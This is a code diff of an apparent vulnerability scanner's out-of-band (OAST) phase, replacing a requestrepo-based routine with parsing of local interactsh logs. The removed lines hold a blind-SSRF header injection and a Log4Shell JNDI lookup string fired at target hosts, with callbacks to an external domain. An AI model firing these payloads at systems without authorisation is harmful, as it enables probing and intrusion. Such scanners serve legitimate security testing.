@@ -1,88 +1,55 @@
-import requests
-import time
 import logging
+import json
+import time
+import os
+import subprocess
 from rich.console import Console
-from rich.panel import Panel
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 console = Console()
 log = logging.getLogger("rich")
 
 def run_oast(session, config):
-    """
-    Phase 4.8: Blind SSRF (OAST Protocol)
-    Injects Out-of-Band payloads into headers to hunt for backend request forgery.
-    """
-    console.print("[bold blue]━━ PHASE 4.8: BLIND SSRF (OAST PROTOCOL) ━━[/bold blue]")
-
-    if not session.live_hosts:
-        log.warning("No live hosts for OAST testing. Skipping.")
-        return
-
-    # 1. Register OAST Session
-    try:
-        console.print("INFO     Initializing OAST Server (RequestRepo)...")
-        r = requests.post("https://requestrepo.com/api/get_token", timeout=10)
-        token = r.json().get('token')
-        if not token:
-            raise Exception("Failed to retrieve token")
-        
-        oast_domain = f"{token}.requestrepo.com"
-        oast_url = f"http://{oast_domain}"
-        console.print(f"[cyan]  + OAST Payload Generated: {oast_domain}[/cyan]")
-    except Exception as e:
-        log.error(f"Failed to initialize OAST server: {e}")
-        return
-
-    # 2. Poison Headers
-    headers = {
-        "User-Agent": f"Arbiter/2.0 ({oast_url})",
-        "Referer": oast_url,
-        "X-Forwarded-For": oast_domain,
-        "X-Real-IP": oast_domain,
-        "Contact": oast_url,
-        "X-Api-Version": f"${{jndi:ldap://{oast_domain}/a}}" # Log4Shell Canary
-    }
-
-    console.print(f"INFO     Firing Blind SSRF payloads at {len(session.live_hosts)} targets...")
+    console.print("\n[bold blue]━━ PHASE 8: THE OAST ENGINE (INTERACTSH LOCAL DAEMON) ━━[/bold blue]")
     
-    for host in session.live_hosts:
-        target = host.get('url')
-        if not target: continue
-        
-        try:
-            requests.get(target, headers=headers, timeout=3, verify=False)
-        except Exception:
-            pass
+    console.print("INFO     Idling for 5 seconds to allow backend queues to process OAST payloads...")
+    time.sleep(5)
+    
+    console.print("INFO     Polling Local Daemon Logs for Cryptographic Callbacks...")
+    
+    # Check if the daemon actually logged anything
+    if not os.path.exists(".oast_logs.json"):
+        console.print("  + No Out-of-Band interactions detected. Zero False Positives.")
+        return
 
-    # 3. Wait for Callbacks (Some backend queues take time)
-    console.print("INFO     Awaiting Out-of-Band callbacks (10 seconds)...")
-    time.sleep(10)
+    # Parse the local JSON lines written by interactsh-client
+    interactions = []
+    with open(".oast_logs.json", "r") as f:
+        for line in f:
+            if line.strip():
+                try:
+                    interactions.append(json.loads(line))
+                except json.JSONDecodeError:
+                    pass
 
-    # 4. Poll for Results
-    try:
-        poll = requests.get(f"https://requestrepo.com/api/get_requests?token={token}", timeout=10)
-        interactions = poll.json()
-        
-        if interactions:
-            console.print(Panel(
-                f"[bold red]CRITICAL: BLIND SSRF / OOB INTERACTION DETECTED[/bold red]\n"
-                f"Payload Triggered: {oast_domain}\n"
-                f"Interactions Logged: {len(interactions)}\n"
-                f"Action: Review logs manually to identify vulnerable host.",
-                title="❌ OUT-OF-BAND HIT", border_style="red"
-            ))
-            session.vulnerabilities.append({
-                "name": "Server-Side Request Forgery (Blind SSRF)",
-                "severity": "CRITICAL",
-                "url": "Multiple (Check OAST Dashboard)",
-                "info": f"OAST callback received. View full HTTP trace at: https://requestrepo.com/#/{token}"
-            })
-        else:
-            console.print("[green]  + No immediate OAST callbacks detected.[/green]")
-            console.print(f"[dim]  + Note: Some backend jobs take hours. Save this link to check later:[/dim]")
-            console.print(f"[dim]  + Dashboard: https://requestrepo.com/#/{token}[/dim]")
+    if not interactions:
+        console.print("  + No Out-of-Band interactions detected. Zero False Positives.")
+        return
+
+    # Map the hashes back to the original target URLs
+    import hashlib
+    url_map = {hashlib.md5((u['url'] if isinstance(u, dict) else u).encode()).hexdigest()[:8]: (u['url'] if isinstance(u, dict) else u) for u in session.get_crawled_urls()}
+    
+    found_vulns = []
+    dump_str = json.dumps(interactions)
+    
+    for u_hash, url in url_map.items():
+        if u_hash in dump_str:
+            console.print(f"[bold red]  ! [CRITICAL] 100% CONFIRMED BLIND INTERACTION (SSRF/Log4j) on {url}[/bold red]")
+            found_vulns.append({"type": "VULN", "name": "Blind OAST Interaction", "matched-at": url, "info": {"severity": "CRITICAL"}})
             
-    except Exception as e:
-        log.error(f"Failed to poll OAST server: {e}")
+    if found_vulns:
+        session.vulnerabilities.extend(found_vulns)
+        console.print(f"  + Injected {len(found_vulns)} proven vulnerabilities into State Graph.")
+    else:
+        # We got interactions, but they didn't match our hash format (e.g., background internet noise scanning the OAST domain)
+        console.print("  + Local Daemon captured interactions, but none matched our cryptographic signatures.")
